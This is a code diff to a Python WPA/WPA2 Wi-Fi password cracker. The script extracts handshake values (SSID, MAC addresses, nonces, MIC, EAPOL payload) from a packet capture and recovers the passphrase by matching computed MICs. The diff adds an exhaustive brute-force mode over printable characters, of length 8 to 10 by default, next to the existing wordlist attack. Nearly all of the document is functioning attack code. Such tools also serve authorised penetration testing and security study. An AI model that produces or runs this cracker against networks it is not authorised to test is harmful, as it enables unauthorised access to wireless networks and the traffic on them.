@@ -1,10 +1,17 @@
 from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11, Raw
+import tqdm
 import hmac
 import hashlib
 import binascii
 import argparse
 import sys
 import os
+import string
+import itertools
+
+CHARSET = ''.join(c for c in string.printable if not c.isspace())
+BRUTE_FORCE = False
+
 
 # PMK Derivation
 def pbkdf2_sha1(passphrase, ssid, iterations=4096, dklen=32):
@@ -95,13 +102,45 @@ def extract_handshake_info(capfile):
                     message2_found = True
 
     if None in [ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload]:
+        print(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload)
         raise ValueError("⚠️ Could not extract all fields from handshake.")
 
     return ssid, ap_mac, client_mac, anonce, snonce, mic, bytes(eapol_payload)
 
 
+def crack_with_bruteforce(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload,
+                          charset=CHARSET, min_len=8, max_len=10):
+    """Performs an efficient on-the-fly bruteforce attack."""
+    print(f"[*] Starting bruteforce attack with charset: '{charset}'")
+    print(f"[*] Password length range: {min_len} to {max_len}")
+    
+    found_password = None
+
+    for length in range(min_len, max_len + 1):
+        if found_password: break
+        num_combinations = len(charset) ** length
+        print(f"\n[*] Generating and testing {num_combinations:,} combinations of length {length}...")
+        password_generator = (''.join(p) for p in itertools.product(charset, repeat=length))
+       
+        label = b"Pairwise key expansion"
+        seed = build_b(ap_mac, client_mac, anonce, snonce)
+
+        with tqdm.tqdm(total=num_combinations, unit='pass', desc=f"Length {length}") as pbar:
+            for password in password_generator:
+                if found_password: break
+                pmk = pbkdf2_sha1(password, ssid)
+                ptk = custom_prf512(pmk, label, seed)
+                calculated_mic = compute_mic(ptk, eapol_payload)
+
+                if calculated_mic.hex() == mic.hex():
+                    print(f"[✓] Password found: {password}")
+                    return password
+
+                print(f"[-] Tried: {password}")
+
+
 # Cracking loop
-def crack_password(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, passlist_file):
+def crack_password_wordlist(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, passlist_file):
     label = b"Pairwise key expansion"
     seed = build_b(ap_mac, client_mac, anonce, snonce)
 
@@ -125,7 +164,9 @@ def crack_password(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload,
 def parse_arguments():
     parser = argparse.ArgumentParser(description='WPA/WPA2 Password Cracker')
     parser.add_argument('cap_file', help='Path to the capture file (.cap)')
-    parser.add_argument('passlist_file', help='Path to the password wordlist file')
+    parser.add_argument('--passlist_file', help='Path to the password wordlist file')
+    parser.add_argument('--max_len',type=int, help='Maximum length of brute-forced password')
+    parser.add_argument('--min_len',type=int, help='Minimum length of brute-forced password')
     return parser.parse_args()
 
 
@@ -134,10 +175,9 @@ def validate_files(cap_file, passlist_file):
         print(f"[ERROR] Capture file not found: {cap_file}")
         sys.exit(1)
     
-    if not os.path.exists(passlist_file):
+    if passlist_file and not os.path.exists(passlist_file):
         print(f"[ERROR] Password list file not found: {passlist_file}")
         sys.exit(1)
-
 
 if __name__ == "__main__":
     args = parse_arguments()
@@ -145,7 +185,11 @@ if __name__ == "__main__":
     
     try:
         print(f"[*] Using capture file: {args.cap_file}")
-        print(f"[*] Using password list: {args.passlist_file}")
+        if args.passlist_file:
+            print(f"[*] Using password list: {args.passlist_file}")
+        else:
+            BRUTE_FORCE = True
+
         print("[*] Extracting handshake data...")
         
         ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload = extract_handshake_info(args.cap_file)
@@ -157,7 +201,12 @@ if __name__ == "__main__":
         print("EOPL:", eapol_payload.hex())
 
         print("[*] Starting password cracking...")
-        crack_password(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, args.passlist_file)
+        if BRUTE_FORCE:
+            max_len = args.max_len if args.max_len is not None else 10
+            min_len = args.min_len if args.min_len is not None else 8
+            crack_with_bruteforce(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, max_len=max_len, min_len=min_len)
+        else:
+            crack_password_wordlist(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, args.passlist_file)
 
     except Exception as e:
         print(f"[ERROR] {e}")
